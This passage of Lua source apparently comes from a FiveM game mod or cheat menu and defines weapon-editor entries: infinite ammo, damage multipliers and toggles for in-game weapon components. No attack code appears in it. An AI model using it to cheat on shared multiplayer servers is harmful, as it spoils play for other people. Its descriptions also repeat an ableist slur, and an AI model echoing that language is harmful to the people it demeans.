            {text = 'Set ammo in clip', dkey = 'weapon:specialcarbine_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:specialcarbine_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:specialcarbine_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:specialcarbine_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:specialcarbine_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_CLIP_02`},
            {text = 'Drum clip', dkey = 'weapon:specialcarbine_drumclip', desc = 'Enable the drum clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_CLIP_03`},
            {text = 'Flashlight', dkey = 'weapon:specialcarbine_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:specialcarbine_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM`},
            {text = 'Suppressor', dkey = 'weapon:specialcarbine_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:specialcarbine_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Gun metal finish', dkey = 'weapon:specialcarbine_gunmetalfinish', desc = 'Enable the gun metal finish.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_VARMOD_LOWRIDER`},
        },
        
        ['weapon:bullpuprifle'] = {
            {text = 'Set ammo', dkey = 'weapon:bullpuprifle_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:bullpuprifle_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:bullpuprifle_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:bullpuprifle_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:bullpuprifle_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:bullpuprifle_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:bullpuprifle_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:bullpuprifle_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Scope', dkey = 'weapon:bullpuprifle_scope', desc = 'Enable the scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL`},
            {text = 'Suppressor', dkey = 'weapon:bullpuprifle_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:bullpuprifle_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP`},
            {text = 'Gun metal finish', dkey = 'weapon:bullpuprifle_gunmetalfinish', desc = 'Enable the gun metal finish.', afu = __REAPER1__.M.weapon.editor.luxuryvariant, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_VARMOD_LOW`},
        },
        
        ['weapon:bullpuprifle_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:bullpuprifle_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:bullpuprifle_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:bullpuprifle_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:bullpuprifle_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:bullpuprifle_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:bullpuprifle_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:bullpuprifle_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:bullpuprifle_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:bullpuprifle_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:bullpuprifle_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:bullpuprifle_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:bullpuprifle_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:bullpuprifle_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:bullpuprifle_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_02_MK2`},
            {text = 'Medium scope', dkey = 'weapon:bullpuprifle_mk2_mediumscope', desc = 'Enable the medium scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_SMALL_MK2`},
            {text = 'Suppressor', dkey = 'weapon:bullpuprifle_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP`},
            {text = 'Grip', dkey = 'weapon:bullpuprifle_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02`},
            {text = 'Flat muzzle break', dkey = 'weapon:bullpuprifle_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:bullpuprifle_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:bullpuprifle_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:bullpuprifle_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:bullpuprifle_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:bullpuprifle_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:bullpuprifle_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:bullpuprifle_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_BP_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:bullpuprifle_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_BP_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:bullpuprifle_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:bullpuprifle_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:bullpuprifle_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:bullpuprifle_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:bullpuprifle_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:bullpuprifle_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:bullpuprifle_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:bullpuprifle_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:bullpuprifle_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:bullpuprifle_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:bullpuprifle_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_BULLPUPRIFLE_MK2_CAMO_IND_01`},
        },
        
        ['weapon:specialcarbine_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:specialcarbine_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:specialcarbine_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:specialcarbine_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:specialcarbine_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:specialcarbine_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:specialcarbine_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:specialcarbine_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:specialcarbine_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:specialcarbine_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:specialcarbine_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING`},
            {text = 'Metal jacket rounds', dkey = 'weapon:specialcarbine_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:specialcarbine_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_FLSH`},
            {text = 'Holographic sight', dkey = 'weapon:specialcarbine_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:specialcarbine_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_MK2`},
            {text = 'Large scope', dkey = 'weapon:specialcarbine_mk2_largescope', desc = 'Enable the large scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MEDIUM_MK2`},
            {text = 'Suppressor', dkey = 'weapon:specialcarbine_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_SUPP_02`},
            {text = 'Grip', dkey = 'weapon:specialcarbine_mk2_grip', desc = 'Enable the grip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_AR_AFGRIP_02`},
            {text = 'Flat muzzle break', dkey = 'weapon:specialcarbine_mk2_flatmuzzlebreak', desc = 'Enable the flat muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_01`},
            {text = 'Tactical muzzle break', dkey = 'weapon:specialcarbine_mk2_tacticalmuzzlebreak', desc = 'Enable the tactical muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_02`},
            {text = 'Fat-end muzzle break', dkey = 'weapon:specialcarbine_mk2_fat-endmuzzlebreak', desc = 'Enable the fat-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_03`},
            {text = 'Precision muzzle break', dkey = 'weapon:specialcarbine_mk2_precisionmuzzlebreak', desc = 'Enable the precision muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_04`},
            {text = 'Heavy duty muzzle break', dkey = 'weapon:specialcarbine_mk2_heavydutymuzzlebreak', desc = 'Enable the heavy duty muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_05`},
            {text = 'Slanted muzzle break', dkey = 'weapon:specialcarbine_mk2_slantedmuzzlebreak', desc = 'Enable the slanted muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_06`},
            {text = 'Split-end muzzle break', dkey = 'weapon:specialcarbine_mk2_split-endmuzzlebreak', desc = 'Enable the split-end muzzle break.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_MUZZLE_07`},
            {text = 'Default barrel', dkey = 'weapon:specialcarbine_mk2_defaultbarrel', desc = 'Enable the default barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SC_BARREL_01`},
            {text = 'Heavy barrel', dkey = 'weapon:specialcarbine_mk2_heavytbarrel', desc = 'Enable the heavy barrel.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_BP_BARREL_02`},
            {text = 'Digital camo', dkey = 'weapon:specialcarbine_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:specialcarbine_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:specialcarbine_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:specialcarbine_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:specialcarbine_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:specialcarbine_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:specialcarbine_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:specialcarbine_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:specialcarbine_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:specialcarbine_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:specialcarbine_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SPECIALCARBINE_MK2_CAMO_IND_01`},
        },
        
        ['weapon:assaultrifle_mk2'] = {
            {text = 'Set ammo', cdkey = 'weapon:assaultrifle_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', cdkey = 'weapon:assaultrifle_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', cdkey = 'weapon:assaultrifle_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', cdkey = 'weapon:assaultrifle_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', cdkey = 'weapon:assaultrifle_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:assaultrifle_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:assaultrifle_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:assaultrifle_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:assaultrifle_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY`},
            {text = 'Armor piercing rounds', dkey = 'weapon:assaultrifle_mk2_armorpiercingrounds', desc = 'Enable the armor piercing rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING`},
